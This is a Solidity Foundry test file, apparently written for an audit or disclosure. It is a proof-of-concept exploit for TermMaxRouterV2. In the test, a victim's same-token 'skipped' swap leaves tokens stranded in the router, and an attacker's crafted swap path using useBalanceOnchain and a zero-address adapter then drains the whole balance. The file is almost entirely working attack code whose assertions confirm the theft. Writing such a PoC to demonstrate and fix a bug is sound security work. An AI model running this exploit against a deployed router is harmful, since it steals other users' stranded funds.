// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {RouterTestV2} from "./RouterV2.t.sol";
import {SwapUnit} from "contracts/v1/router/ISwapAdapter.sol";
import {SwapPath} from "contracts/v2/router/ITermMaxRouterV2.sol";

/// @notice PoC for cross-user theft of ERC20 balances stranded in TermMaxRouterV2.
contract RouterBalanceDrainPoC is RouterTestV2 {
    function test_PoC_CrossUserDrainAfterSameTokenSkip() public {
        address victim = vm.addr(0xBEEF);
        address attacker = vm.addr(0xCAFE);
        uint256 amount = 1_000e8;

        // The interface explicitly documents tokenIn == tokenOut as a supported
        // skipped unit. The victim therefore uses a no-op path to deliver the
        // input token to the path recipient.
        res.debt.mint(victim, amount);

        vm.startPrank(victim);
        res.debt.approve(address(res.router), amount);

        SwapUnit[] memory victimUnits = new SwapUnit[](1);
        victimUnits[0] = SwapUnit({
            adapter: address(0),
            tokenIn: address(res.debt),
            tokenOut: address(res.debt),
            swapData: bytes("")
        });

        SwapPath[] memory victimPaths = new SwapPath[](1);
        victimPaths[0] = SwapPath({
            inputAmount: amount,
            recipient: victim,
            useBalanceOnchain: false,
            units: victimUnits
        });

        res.router.swapTokens(victimPaths);
        vm.stopPrank();

        // The transferFrom already happened, but _executeSwapUnits merely
        // continues, so nothing is delivered to the victim.
        assertEq(res.debt.balanceOf(victim), 0, "victim unexpectedly kept funds");
        assertEq(res.debt.balanceOf(address(res.router)), amount, "funds were not stranded");

        // A different, unprivileged caller consumes the router's entire
        // persistent token balance. adapter == address(0) is the documented
        // direct-transfer mode. tokenOut only needs to differ from tokenIn to
        // avoid the preceding same-token skip; the branch transfers tokenIn.
        vm.startPrank(attacker);

        SwapUnit[] memory attackerUnits = new SwapUnit[](1);
        attackerUnits[0] = SwapUnit({
            adapter: address(0),
            tokenIn: address(res.debt),
            tokenOut: address(res.ft),
            swapData: bytes("")
        });

        SwapPath[] memory attackerPaths = new SwapPath[](1);
        attackerPaths[0] = SwapPath({
            inputAmount: 0,
            recipient: attacker,
            useBalanceOnchain: true,
            units: attackerUnits
        });

        res.router.swapTokens(attackerPaths);
        vm.stopPrank();

        assertEq(res.debt.balanceOf(attacker), amount, "attacker did not receive victim funds");
        assertEq(res.debt.balanceOf(address(res.router)), 0, "router balance was not drained");
    }
}
